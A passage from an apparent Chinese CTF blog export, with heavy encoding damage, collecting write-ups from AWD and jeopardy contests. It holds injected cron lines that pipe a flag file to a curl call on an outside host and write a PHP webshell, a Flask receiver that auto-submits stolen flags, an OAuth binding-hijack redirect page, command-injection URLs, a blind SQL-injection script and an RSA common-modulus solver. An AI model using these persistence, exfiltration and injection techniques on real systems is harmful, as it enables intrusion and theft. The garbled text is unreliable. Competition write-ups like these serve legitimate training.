<figure class="highlight plain"><figcaption><span>\"* * * * * cat</span><a href="/flag/flag.txt">| curl  http://172.91.0.115:3001/flag --data-binary @- \n* * * * * echo \\\"<?php \\\\\\n if(@md5(\\\\\\\$_POST[pass])</a></a></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ä¸€å…±æ¤å…¥äº†ä¸¤æ¡å®šæ—¶ä»»åŠ¡ï¼ˆæŒ‰ä¸ªäººéœ€æ±‚æ¤å…¥ï¼‰ï¼Œç¬¬ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ˜¯æ¯ä¸ªä¸€åˆ†é’Ÿå¸¦ç€flagï¼Œpostè¯·æ±‚æˆ‘æœ¬åœ°å¼€å¯çš„3001ç«¯å£çš„webæœåŠ¡ä¸€æ¬¡ï¼Œæ‰€ä»¥å°±åç€æ”¶flagå°±å¥½äº†ï¼Œç¬¬äºŒä¸ªå®šæ—¶ä»»åŠ¡æ˜¯å¾€ç½‘ç«™æ ¹æœ¨é©¬å†™é©¬ï¼Œæ¤å…¥çš„æ•ˆæœ â†“ â†“ â†“</span><br><span class="line">![](é¹åŸæ¯å†³èµ›-webæºç åˆ†æ-ç¨³å®šè‡ªåŠ¨åŒ–ä¸Šåˆ†ä¹‹è·¯&#x2F;8418106-c8e3f8ea1c03a546.png)</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥æœ¬åœ°èµ·ä¸ªflaskæœåŠ¡ï¼ˆæ¯”è¾ƒå¥½è‡ªåŠ¨åŒ–æäº¤flagå’Œè®¾å®šç«¯å£ï¼‰ï¼Œæ¥å— flag å¹¶è‡ªåŠ¨æäº¤å°±å¥½äº†ï¼Œå¤§å¸ˆå‚…ä»¬é—®æ²¡æœ‰æƒé™æ€ä¹ˆæ‰§è¡Œcrontabï¼Œcrontabä¸éœ€è¦rootæƒé™çš„ï¼Œä»€ä¹ˆç”¨æˆ·èµ·çš„å°±æ˜¯ä»€ä¹ˆæƒé™ï¼Œæ‰€ä»¥www-dataç”¨æˆ·æ³¨ä¸Šå‘½ä»¤ï¼Œéœ€è¦æœ¬åœ°ä¸Šä¸ª shell å»killæ‰è¡Œçš„ã€‚</span><br><span class="line"></span><br><span class="line">![](é¹åŸæ¯å†³èµ›-webæºç åˆ†æ-ç¨³å®šè‡ªåŠ¨åŒ–ä¸Šåˆ†ä¹‹è·¯&#x2F;8418106-6f5df9dd01e170f6.png)</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæ”¾ä¸€ä¸‹ä¸€ç™½å¤§å¸ˆå‚…å†™çš„èµ·flaskæœåŠ¡çš„è„šæœ¬(ä¿®æ”¹ç‰ˆ)</span><br></pre></td></tr></table></figure>
<h1 id="coding-utf8"><a href="#coding-utf8" class="headerlink" title="- coding:utf8"></a>- coding:utf8</h1><p>from flask import *<br>import requests</p>
<p>app = Flask(<strong>name</strong>)</p>
<p>url = â€œ<a href="http://172.91.1.12:9090/arace/index&quot;" target="_blank" rel="noopener">http://172.91.1.12:9090/arace/index&quot;</a><br>token = â€œ0ade4d3d8b7ed42fâ€</p>
<p>server_port = 3001</p>
<p>def submit_token(url,answer,token):<br>    data ={â€œtokenâ€:token,â€flagâ€:answer}<br>    resp = requests.post(url,data=data)<br>    if (resp.status_code != â€œ404â€):<br>        print â€œStatus code:%dâ€%(resp.status_code)</p>
<p>def submit_cookie(ip,answer):<br>    submit_ip = â€˜172.91.1.12:9090â€™<br>    urls=â€™http://%s/ad/hacker/submit/submitCodeâ€™% submit_ip<br>    post = {â€˜flagâ€™:answer}<br>    â€˜â€™â€™cmder = â€˜ %s -b â€œJSESSIONID=C64DD133EFDDB22CE5BE4CA3991AB6DFâ€ -d â€œflag=%sâ€â€˜% (urls,answer)<br>                #print cmd<br>                os.system(â€˜curl â€˜ + cmder)â€™â€™â€™</p>
<pre><code>header = {&apos;Host&apos;: &apos;172.91.1.12:9090&apos;,
          &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;,
          &apos;Accept&apos;: &apos;application/json, text/javascript, */*; q=0.01&apos;,
          &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;,
          &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,
          &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,
          &apos;Referer&apos;: &apos;http://172.91.1.12:9090/arace/index&apos;,
          &apos;Content-Length&apos;: &apos;14&apos;,
          &apos;Cookie&apos;: &apos;JSESSIONID=77A0AFA7757CE43018889FCF9AAFE59A&apos;}

req = requests.post(urls,headers = header,data=post)
print req.content
if &apos;errorInfo&apos; not in req.content:
    print &apos; &apos; + req.content</code></pre><p>last_flag = {}</p>
<p>@app.route(â€˜/flagâ€™, methods=[â€˜POSTâ€™])<br>def receive_flag():<br>    flag = request.get_data().strip()<br>    ip = request.remote_addr<br>    if not last_flag.has_key(ip):<br>        last_flag[ip] = set()<br>    ip_flag_list = last_flag.get(ip, set())<br>    if flag in ip_flag_list:<br>        print â€œReceive %s from %s , already submitted.â€ % (flag, ip)<br>        return â€œâ€<br>    ip_flag_list.add(flag)<br>    result = â€œâ€<br>    print â€œ\nReceive from : %s\nflag : %sâ€% (ip,flag)<br>    submit_cookie(ip,flag)<br>    return â€˜â€™</p>
<p>if <strong>name</strong> == â€˜<strong>main</strong>â€˜:<br>    app.run(â€œ0.0.0.0â€, port=server_port)</p>
<p>```</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>èƒ½åŠ›æœ‰é™ï¼Œå¯èƒ½æœ‰çš„æ´æ²¡æœ‰åˆ†æå‡ºæ¥ã€‚æœ¬æƒ³ç”¨ä¸€åªåˆšå†™çš„ç—…æ¯’æ€§åé—¨æ¥è¯•è¯•çš„ï¼Œè¿™æ¬¡è¿˜æ²¡æœ‰å®éªŒï¼Œç­‰åç»­åœ¨æ”»é˜²èµ›ä¸­å®éªŒæˆåŠŸåå†å…¬å¼€ã€‚æœ¬èœç¬¬äºŒå¤©ç”±äºæ“ä½œå¤±è¯¯ï¼Œç¬¬ä¸€æ³¢æ‹¿flagå‘½ä»¤è¾“å…¥æˆäº†<em>cat /flag</em>ï¼Œç„¶è€Œflagåœ¨ /flag/flag.txt äº†ï¼Œç­‰åˆ°ç¬¬äºŒæ³¢æ³¨å…¥ä»»åŠ¡æ—¶ï¼Œæ‰äº†å¥½å¤šï¼Œæ‰€ä»¥åˆ°æœ€åè¿˜æ˜¯æ¥æ”¶äº†ä¸€å¤§å †ç©ºå­—ç¬¦è¿‡æ¥ï¼Œè€Œä¸”å†™é©¬çš„ç›®å½•è¿˜å†™é”™äº†ï¼ŒçœŸçš„æ˜¯è®©äººå¤´ç§ƒï¼Œè¢«å¤§å¸ˆå‚…ä»¬ç¬‘æ­»ï¼Œè¡€äºã€‚åŒæ—¶å¼€åœºç”¨shellæ‰¹é‡æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä»–çš„æ¶åŠ£æ“ä½œå°±ä¸å†™äº†ï¼Œæ€•è¢«æ‰“æ­»ã€‚æ”¾ä¸€å¼ æœ€ç»ˆæˆç»©å›¾<br><img src="https://upload-images.jianshu.io/upload_images/8418106-4db54902e9d1c47d.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="æœ€åæˆç»©"></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>AWD</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 X-NUCA Cyc1e_writeup</title>
    <url>/2018/11/26/2018X-NUCA-Cyc1e-writeup/</url>
    <content><![CDATA[<h3 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h3><p>åˆ†ææµé‡åŒ…ï¼Œä¸€å…±åŒ…å«å…­ç»„RSAçš„äº¤äº’ä¿¡æ¯ï¼Œcopyå‡ºæ¥å¯¹æ¯”æœ‰ä¸¤ç»„çš„næ˜¯ç›¸åŒçš„</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">This is a message distribute system. Please tell me your name: </span><br><span class="line">Dave</span><br><span class="line">Hi Dave, your N is: 25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span><br><span class="line"><span class="keyword">And</span> your exponent is: 6947</span><br><span class="line">Last but <span class="keyword">not</span> least, your<span class="built_in"> secret </span>is: 20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span><br><span class="line">You will know the<span class="built_in"> secret </span>after I give you P,Q.</span><br><span class="line">See you next time!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This is a message distribute system. Please tell me your name: </span><br><span class="line">Alice</span><br><span class="line">Hi Alice, your N is: 25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span><br><span class="line"><span class="keyword">And</span> your exponent is: 7669</span><br><span class="line">Last but <span class="keyword">not</span> least, your<span class="built_in"> secret </span>is: 22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span><br><span class="line">You will know the<span class="built_in"> secret </span>after I give you P,Q.</span><br><span class="line">See you next time!</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªå¸¸è§„çš„RSAå…±æ¨¡æ”»å‡»ï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="attr">from</span> <span class="string">libnum import n2s,s2n</span></span><br><span class="line"><span class="attr">from</span> <span class="string">gmpy2 import invert</span></span><br><span class="line"><span class="attr">def</span> <span class="string">egcd(a, b):</span></span><br><span class="line">  <span class="attr">if</span> <span class="string">a == 0:</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">(b, 0, 1)</span></span><br><span class="line">  <span class="attr">else</span>:<span class="string"></span></span><br><span class="line">    <span class="meta">g,</span> <span class="string">y, x = egcd(b % a, a)</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">(g, x - (b // a) * y, y)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">def</span> <span class="string">main():</span></span><br><span class="line">  <span class="attr">n</span> = <span class="string">25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span></span><br><span class="line">  <span class="attr">c1</span> = <span class="string">20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span></span><br><span class="line">  <span class="attr">c2</span> = <span class="string">22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span></span><br><span class="line">  <span class="attr">e1</span> = <span class="string">6947</span></span><br><span class="line">  <span class="attr">e2</span> = <span class="string">7669</span></span><br><span class="line">  <span class="attr">s</span> = <span class="string">egcd(e1, e2)</span></span><br><span class="line">  <span class="attr">s1</span> = <span class="string">s[1]</span></span><br><span class="line">  <span class="attr">s2</span> = <span class="string">s[2]</span></span><br><span class="line">  <span class="attr">if</span> <span class="string">s1&lt;0:</span></span><br><span class="line">    <span class="attr">s1</span> = <span class="string">- s1</span></span><br><span class="line">    <span class="attr">c1</span> = <span class="string">invert(c1, n)</span></span><br><span class="line">  <span class="attr">elif</span> <span class="string">s2&lt;0:</span></span><br><span class="line">    <span class="attr">s2</span> = <span class="string">- s2</span></span><br><span class="line">    <span class="attr">c2</span> = <span class="string">invert(c2, n)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">m</span> = <span class="string">pow(c1,s1,n)*pow(c2,s2,n) % n</span></span><br><span class="line">  <span class="attr">print</span> <span class="string">n2s(m)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">if</span> <span class="string">__name__ == '__main__':</span></span><br><span class="line">  <span class="attr">main()</span></span><br></pre></td></tr></table></figure>

<h3 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h3><p>é¢˜ç›®æç¤ºäº†ç¬¬ä¸‰æ–¹ç™»å…¥è®¤è¯æ–¹å¼æ˜¯OAuth2.0çš„ï¼ŒOAuth2.0å­˜åœ¨ä¸€ä¸ªå¿«æ·ç™»å½•æˆæƒåŠ«æŒé—®é¢˜ï¼Œä¸»è¦åœ¨äºcodeå˜é‡ï¼Œç„¶åå°±å…¥å‘äº†ï¼Œæœ€å¼€å§‹çš„æ€è·¯æ˜¯è®©adminè®¿é—®å¿«æ·ç™»å…¥é¡µé¢ï¼Œä¿®æ”¹redirect_uri æ¥æŠ“å–é‡ç½®çš„codeï¼Œç„¶åä¼ªé€ adminç”¨æˆ·ç™»å…¥ï¼Œç„¶åå‘ç°redirect_uriä¸å¯ä¼ªé€ ï¼Œå°±è‡ªé—­äº†ï¼ˆå…·ä½“åˆ†æå¯ä»¥çœ‹ï¼š<a href="https://bbs.ichunqiu.com/thread-34168-1-1.htmlï¼‰ã€‚æœ¬é¢˜çš„ä¸»è¦åˆ©ç”¨ç‚¹åœ¨äºå¸å·å¯é‡å¤ç»‘å®šä¸åŒçš„ç¬¬ä¸‰æ–¹é‚®ç®±ï¼Œæ‰€ä»¥è®©adminç»‘å®šä¸Šæˆ‘ä»¬æ³¨å†Œçš„é‚®ç®±ï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹é‚®ç®±ç™»å…¥adminå¸å·å³å¯å¾—åˆ°flagã€‚é€šè¿‡/main/registeræ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œregisteréœ€è¦æ¢æµ‹ä¸€ä¸‹" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-34168-1-1.htmlï¼‰ã€‚æœ¬é¢˜çš„ä¸»è¦åˆ©ç”¨ç‚¹åœ¨äºå¸å·å¯é‡å¤ç»‘å®šä¸åŒçš„ç¬¬ä¸‰æ–¹é‚®ç®±ï¼Œæ‰€ä»¥è®©adminç»‘å®šä¸Šæˆ‘ä»¬æ³¨å†Œçš„é‚®ç®±ï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹é‚®ç®±ç™»å…¥adminå¸å·å³å¯å¾—åˆ°flagã€‚é€šè¿‡/main/registeræ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œregisteréœ€è¦æ¢æµ‹ä¸€ä¸‹</a></p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-35fe46782118d653.png" alt><br>ç¬¬ä¸‰æ–¹ç™»å…¥æ–¹å¼æ³¨å†Œä¸€ä¸ªé‚®ç®±å¸å·ç”¨æ¥ç»‘å®šï¼Œé€šè¿‡ç»‘å®šç¬¬ä¸‰æ–¹é‚®ç®±ï¼Œæˆªå–ç»‘å®šçš„æµé‡åŒ…</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-901058431549ca2d.png" alt></p>
<p>ç»‘å®šç¬¬ä¸‰æ–¹é‚®ç®±ä¸»è¦é€šè¿‡stateå’Œcodeè¿›è¡Œè®¤è¯ï¼Œå³åªè¦stateå’Œcodeæ­£ç¡®ï¼Œå³å¯ç»‘å®šæˆåŠŸï¼Œå¹¶ä¸æ ¡éªŒç»‘å®šçš„è´¦æˆ·æ˜¯ä»€ä¹ˆï¼Œä»è€Œå¯ä»¥è¾¾åˆ°ç»‘å®šå…¶ä»–ç”¨æˆ·å¹¶è¦†ç›–ç»‘å®šé‚®ç®±çš„ç›®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©adminç”¨æˆ·å»è®¿é—®Urlï¼š<a href="http://106.75.66.211:8000/main/oauth/?state=svFglsaloQ&code=AoWZd4NJLHuVomqQn2hWoDAp6hP6nz03VqDbp6sa" target="_blank" rel="noopener">http://106.75.66.211:8000/main/oauth/?state=svFglsaloQ&amp;code=AoWZd4NJLHuVomqQn2hWoDAp6hP6nz03VqDbp6sa</a> ä¾¿å¯ä»¥è¾¾åˆ°è®©adminå¸å·ç»‘å®šä¸Šæˆ‘ä»¬é‚®ç®±çš„æ•ˆæœï¼Œå¹¶ä¸”åå°è®¾ç½®äº†botï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡post_bugæäº¤ç»‘å®šçš„Urlæ¥è®©adminè®¿é—®ï¼Œç”±äºæäº¤æ¡†æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥ç›´æ¥æäº¤æ˜¯æ²¡æœ‰åŠæ³•çš„ã€‚</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-1d2bf17a7627737b.png" alt></p>
<p>ç”±äº<a href="http://106.75.66.211:8000/main/login?next=/main/login" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=/main/login</a> å¤„å­˜åœ¨é‡å®šå‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å®šå‘è·³è½¬åˆ°vpsä¸Šï¼Œå³<a href="http://106.75.66.211:8000/main/login?next=[your_ip]" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=[your_ip]</a> åœ¨vpsä¸Šå†™ä¸€ä¸ªè·³è½¬é¡µé¢</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.open(<span class="string">'http://106.75.66.211:8000/main/oauth/?state=9PKyRdpU5D&amp;code=Y5WjDdELjUMGaJpbYfs9lOPBtgEvrOOvZxmmwZsj'</span>)</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°†vpsè·³è½¬é¡µé¢åœ°å€å‹ç¼©æˆçŸ­é“¾ï¼ˆ æ¨èä¸ªçŸ­é“¾ç”Ÿæˆåœ°å€ï¼š<a href="https://bitly.com" target="_blank" rel="noopener">https://bitly.com</a> ï¼‰ï¼Œæäº¤bugï¼Œæœ€ç»ˆæäº¤Urlä¸ºï¼š<a href="http://106.75.66.211:8000/main/login?next=https://bit.ly/2Qiixxx" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=https://bit.ly/2Qiixxx</a> ç­‰å¾…botè®¿é—®ååˆ©ç”¨ç¬¬ä¸‰æ–¹é‚®ç®±ç™»å…¥</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-fb8e409e2de06be0.png" alt></p>
<h3 id="ezdotso"><a href="#ezdotso" class="headerlink" title="ezdotso"></a>ezdotso</h3><p>é¢˜ç›®é…ç½®é—®é¢˜ï¼Œä¸Šæ‰‹ç”©ä¸€ä¸ªcat /flagå°±å‡ºäº†ï¼Œæˆ‘å’Œå°ä¼™ä¼´éƒ½æƒŠå‘†äº†ã€‚?action=cmd&amp;cmd=ls%20/ åˆ—æ ¹ç›®å½•ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹<br><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-bc74376afd02b60f.png" alt></p>
<p>?action=cmd&amp;cmd=cat%20/flagå‡ºå¥‡è¿¹â€¦â€¦<br><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-f9fee2030f214445.png" alt></p>
<p><strong>ps:å…¶ä»–å‡ ä¸ªwebéƒ½æ¯”è¾ƒéš¾ï¼Œæ€¼åˆ°è‡ªé—­ï¼Œæœ€åROISå‡ºäº†hardphpï¼Œè¿˜æœ‰js+wasmå’Œweb+pwnçš„ï¼Œåˆå¯ä»¥å­¦ä¹ ä¸€æ³¢äº†ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>RSA</tag>
        <tag>OAuth2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>2018é«˜æ ¡ç½‘ç»œä¿¡æ¯å®‰å…¨ç®¡ç†è¿ç»´æŒ‘æˆ˜èµ›Web_Writeup</title>
    <url>/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>emmmmï¼Œå¾ˆä¹…æ²¡æœ‰å¥½å¥½çš„æ‰“æ¯”èµ›äº†ï¼ŒåŸºæœ¬éƒ½æ˜¯æ»‘æ°´ï¼Œè®¤çœŸæ‰“çš„æ—¶å€™åˆè¢«ä¸€äº›è„‘æ´å¡ä¸€å¤©ï¼Œéš¾å—ï¼Œè¿™æ¬¡çš„é¢˜æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥Writeupä¹Ÿå°±ç®€å•äº›å†™äº†ï¼Œå¯æƒœä¸ä¼šé€†å‘ï¼Œä¸ç„¶åº”è¯¥æœ‰é‚£ä¹ˆç‚¹å¯èƒ½AKå§ã€‚</p>
<h3 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h3><p>ä¸€ä¸ªæ™®é€šçš„BBSï¼Œè¿›å»éšæ‰‹åœ¨ç™»å…¥æ¡†è¾“äº†ä¸ªâ€˜ â€˜ â€™å°±æŠ¥é”™äº†ï¼Œç›´æ¥æŠŠSQLè¯­å¥éƒ½çˆ†å‡ºæ¥äº†</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png" alt><br>ç”©sqlmapçˆ†ç ´ï¼Œçˆ†ç ´çš„æ—¶å€™æŠŠlevelè®¾ç½®é«˜ä¸€äº›ï¼Œå¾ˆå¤šé—®æˆ‘æ€ä¹ˆä»–ä»¬æ²¡çˆ†å‡ºæ¥ï¼Œåº”è¯¥å°±æ˜¯å› ä¸ºlevelçš„åŸå› å§ã€‚flagæ”¾åœ¨bbsåº“flagè¡¨flagå­—æ®µé‡Œã€‚</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3da046af8ea5f69d.png" alt></p>
<h3 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h3><p>è¿™é“é¢˜ç›®å¾ˆæ˜æ˜¾æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œç”±äºå¾ˆè®¨åŒå†™æ³¨å…¥çš„é¢˜ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯å¾ˆåé¢æ‰å†™ï¼Œä¸»è¦é€»è¾‘åœ¨äºæ³¨å†Œç”¨æˆ·æ—¶æˆ‘ä»¬æ’å…¥SQLæŸ¥è¯¢è¯­å¥ï¼Œç™»å…¥åä¹Ÿåœ¨ä¸»é¡µé¢æç¤ºåˆ†æ•°ä¸º0ä»€ä¹ˆçš„ä¿¡æ¯ï¼Œæ‰€ä»¥åœ¨Final Examé¡µé¢æµ‹è¯•ï¼Œå¦‚æœè¿”å›å€¼æ˜¾ç¤ºçš„åˆ†æ•°ä¸ºé0ï¼Œé‚£ä¹ˆåˆ™è¡¨ç¤ºæ³¨å…¥çš„æŸ¥è¯¢è¯­å¥æŸ¥è¯¢æ­£ç¡®ï¼Œè‹¥è¿”å›æ˜¾ç¤ºçš„åˆ†æ•°ä¸º0ï¼Œåˆ™è¯´æ˜æŸ¥è¯¢å¤±è´¥ï¼Œæ‰€ä»¥å…¸å‹çš„ç›²æ³¨äº†ï¼Œæ„é€ payloadï¼šâ€™ or if((ascii(substr((select flag from flag),1,1))=1),1,0)=â€™1â€™ or â€˜ ä½œä¸ºæ³¨å†Œç”¨æˆ·åï¼Œè¿™é‡Œå‘äº†ä¸€ä¸‹ï¼Œåˆšå¼€å§‹ç”¨çš„æ˜¯ andï¼Œåœ¨insertçš„æ—¶å€™ and å’Œ &amp;&amp; ä¸ä¼šå½“ä½œé€»è¾‘è¿ç®—ç¬¦æ‰§è¡Œï¼Œæ‰€ä»¥ç”¨ or æˆ–è€… || ï¼Œå†™ä¸ªç›²æ³¨è„šæœ¬å°±å¥½äº†ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">url_2 = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">url_3 = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(32,126):</span><br><span class="line">		<span class="attribute">ss</span>=requests.session()</span><br><span class="line">		payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">		post_an = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">		post_data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">		r = ss.post(<span class="attribute">url</span>=url,data=post_data)</span><br><span class="line">		login = ss.post(<span class="attribute">url</span>=url_2,data=post_data)</span><br><span class="line">		an = ss.post(<span class="attribute">url</span>=url_3,data=post_an)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> an.content:</span><br><span class="line">			e = chr(j)</span><br><span class="line">			result = result + e</span><br><span class="line">			<span class="builtin-name">print</span> result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3aa8fbe13ff8acf7.png" alt></p>
<h3 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h3><p>é¢˜ç›®å†™å¾—å¾ˆæ¸…æ¥šè¿™é¢˜æ˜¯XXEçš„ç‚¹ï¼Œæ‰€ä»¥å…ˆæŠ“ä¸€ä¸ªhttp requeståŒ…</p>
